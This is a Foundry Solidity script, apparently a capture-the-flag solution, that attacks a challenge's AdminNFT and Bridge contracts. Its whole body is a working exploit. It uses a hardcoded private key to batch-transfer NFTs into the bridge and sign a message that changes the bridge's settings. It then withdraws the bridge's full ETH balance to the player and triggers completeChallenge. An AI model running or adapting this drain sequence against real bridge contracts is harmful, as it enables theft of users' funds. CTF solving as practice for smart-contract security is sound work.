// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Script.sol";

import "script/exploit/Exploit.sol";
import "src/Challenge.sol";
import "src/AdminNFT.sol";
import "src/Bridge.sol";

contract Solve is Script {

    function run() external {
        uint privateKey = 0x459a1b1607e48f0a8a842827b365794fcf885b6199ce19a6b5e44e11262af160;
        vm.startBroadcast(privateKey);

        Challenge challenge = Challenge(0x7E45Fbb45CFADE4a2615C776205CA2E50590f38B);
        AdminNFT anft = challenge.ADMIN_NFT();
        Bridge bridge = challenge.BRIDGE();
        address player = challenge.PLAYER();
        anft.safeBatchTransferFrom(player, address(bridge), new uint[](200), new uint[](200), "");
        bytes memory message = abi.encode(address(challenge), address(anft), uint256(1 << 96));
        bytes[] memory sigs = new bytes[](1);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(privateKey, ECDSA.toEthSignedMessageHash(message));
        sigs[0] = abi.encodePacked(r, s, v);
        bridge.changeBridgeSettings(message, sigs);
        bridge.withdrawEth(keccak256("1"), new bytes[](0), player, address(bridge).balance, "");
        bridge.withdrawEth(keccak256("2"), new bytes[](0), address(challenge), 1, abi.encodeWithSignature("completeChallenge(address)", player));

        vm.stopBroadcast();
    }
}